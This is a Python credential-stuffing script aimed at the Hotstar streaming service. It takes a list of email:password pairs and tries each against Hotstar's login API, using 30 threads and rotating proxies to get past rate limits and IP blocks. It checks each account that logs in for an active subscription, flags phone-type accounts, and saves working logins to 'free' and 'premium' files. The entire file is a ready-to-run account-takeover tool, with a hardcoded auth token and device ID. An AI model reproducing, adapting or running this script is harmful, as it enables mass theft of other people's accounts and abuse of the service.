import requests
from bs4 import BeautifulSoup
import sys
import time
import datetime
import queue
import threading
import random
import subprocess
import code
import json


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

free = 0
prem = 0
count = 1
q = queue.Queue()
lock = []
availabel = []
ip_dict = {}
thrds = 30
if (len(sys.argv)>=3):
    thrds= int(sys.argv[3])

input_file=sys.argv[1]
output_file_free = "HOTstarAc"+datetime.datetime.now().strftime("%d-%h-%H-%M")
output_file_paid = "HOTstarAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M")
countFile = "."+sys.argv[0]+"_"+input_file+"_count"
proxy_file = sys.argv[2]
MAX_PROXY = 0

ua='Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Mobile Safari/537.36'
#ua='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'

loginURL='https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
otpURL = "https://api.hotstar.com/in/aadhar/v2/web/in/user/exists"

headv1 = {
             'content-type': 'application/json',
            'Referer': 'https://www.hotstar.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': '*/*',
            'hotstarauth': 'st=1585646395~exp=1585652395~acl=/*~hmac=d4d22ad5f7777a1e90ecc3f6ef3d72ca649cd8efe1696db398452bc97dc2df97',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
                        }

fi = open(input_file,'r',errors='ignore')


def loadProxies():
    global MAX_PROXY
    global lock
    global availabel
    d = open(proxy_file,'r')
    counter = 0
    for i in d.readlines():
        ip_dict[counter]=i.strip()
        lock.append(0)
        availabel.append(1)
        counter+=1
    if len(ip_dict) == 0:
        MAX_PROXY = 0
        ip_dict[counter]=""
        lock.append(0)
        availabel.append(1)

    else:
        MAX_PROXY = len(ip_dict)-1
    print("Loaded "+str(counter)+" Proxies")

def loadQ():
    global count
    try:
        c = open(countFile,"r")
        cl = c.readline().strip()
        count = int(cl)
        for i in range(int(cl)):
            fi.readline()
    except:
        print("No Resume File Found")
    line = fi.readline();
    while len(line):
        q.put(line)
        line = fi.readline().strip()
    fi.close()

def free_ip():
    global availabel
    global ip_dict

    rand = 0
    while True:
        rand = random.randint(0,MAX_PROXY)
        if availabel[rand] == 1:
            break
    return ip_dict[rand],rand

def get_proxy():
    if MAX_PROXY == 0:
        return "",0
    ip,container = free_ip()
    proxy = {"http":"http://"+ip,
            "https":"http://"+ip}
    return proxy,container

def countLoc():
    global count
    count = count+1
    f2 = open(countFile,'w')
    f2.write(str(count))
    f2.close()

def writeFree(cred1):
    f1 = open(output_file_free,'a')
    f1.write(cred1+"\n")
    f1.close()

def ban_ip(container):
    global availabel;
    global ip_dict
    availabel[container] = 0
    print(ip_dict[container]+"  Blocked ")
    #lock[container] += 1    ### Setting Container offset
    ##if lock[container] == 1:
        #unban_ip(container)
    #else:
        #print("Changing IP")

def unban_ip(container):
    print("first Thread Unblocking ")
    container_nm = str(container+1)
    #print("Calling process for Container "+container_nm)
    #res = subprocess.check_output(["change.sh",container_nm])
    #for line in res.splitlines():
    #    print(line)
    #lock[container] = 0
    #availabel[container] = 1
    #print("unblocked")

def writePaid(cred1,subs,otp):
    f1 = open(output_file_paid,'a')
    template = cred1+" | Subscription: "+subs+" | OTP: "+otp
    f1.write(template+"\n")
    f1.close()

def checkSub(page,proxy):
    j = json.loads(page)
    auth = j["description"]["userIdentity"]
    authUrl = "https://api.hotstar.com/in/gringotts/v2/web/in/subscription?verbose=3"
    authHead = {
        "accept" : "*/*",
        "accept-encoding" : "gzip, deflate, br",
        "accept-language" : "en-US,en;q=0.9,hi;q=0.8",
        "content-type" : "application/json",
        "userid" : auth
        }
    r1 = requests.get(authUrl,headers=authHead,proxies=proxy)
    j2 = json.loads(r1.text)
    pack =j2["active_subs"]
    pack1 = len(pack)
    if(pack1!=0):
        return pack[0]['commercial_pack']
    else:
        return "FREE"

def statusUpdate(cred, subs,container,id,otp):
    global free
    global prem
    template =""
    if id == 1:
        template = cred+" | Subscription: "+OKBLUE+subs+ENDC+" | OTP: "+otp+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:"+WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    elif id == 2:
        template = cred+" | Error: "+FAIL+subs+ENDC+" | COUNTS= Total:"+str(count)+" Free:"+WARNING+str(free)+ENDC+" Premium:"+WARNING+str(prem)+ENDC+" ~ Proxy: "+str(ip_dict[container])
    print(template)

def writeToFile(cred,subs,otp):
    global free
    global prem
    if subs == "FREE":
        writeFree(cred)
        free+=1
    else:
        writePaid(cred,subs,otp)
        prem+=1

def checkOTP(cred,proxy):
    un=cred.split(":")[0]
    pas=cred.split(":")[1]
    otpCheck = {"userData":{"username":un,"usertype":"email","deviceId":"DDC5A89A703B40BF5DF3BAD07EEF3B36C2A511BE"}}
    oC=requests.put(otpURL,headers=headv1,data=json.dumps(otpCheck),proxies=proxy)
    otp_res=json.loads(oC.text)
    if otp_res['description']['usertype'] == 'phone':
        return "YES"
    else:
        return "NO"


class ThreadC(threading.Thread):
    def __init__(self,q):
        threading.Thread.__init__(self)
        self.queue = q

    def run(self):
        while not q.empty():
            cred = q.get().strip()
            un=cred.split(":")[0]
            pas=cred.split(":")[1]
            r = requests.Session()
            try:
                proxy,container= get_proxy()
                r.proxies = proxy
                myusr = {"userData":{"deviceId":"DDC5A89A703B40BF5DF3BAD07EEF3B36C2A511BE","password":pas,"username":un,"usertype":"email","pId":"9d6a416e6f504fa986f2420dbbe8f9ce"},"verification":{}}
                r1 = r.post(loginURL, headers=headv1, data=json.dumps(myusr))
                if(r1.status_code==200):
                    otp = checkOTP(cred,proxy)
                    subs = checkSub(r1.text,proxy)
                    statusUpdate(cred,subs,container,1,otp)
                    writeToFile(cred,subs,otp)
                else:
                    statusUpdate(cred,"Logging Issue",container,2,"NO")
                self.queue.task_done()
                countLoc()
            except:
                print("TIMEOUT OCCURED WAITING")
                ban_ip(container)
                print("Unexpected error:", sys.exc_info()[1])
                time.sleep(10)
                q.put(cred)
                self.queue.task_done()


def main():
    loadQ()
    loadProxies()
    for i in range(thrds):
        t = ThreadC(q)
        t.start()
    q.join()

main()
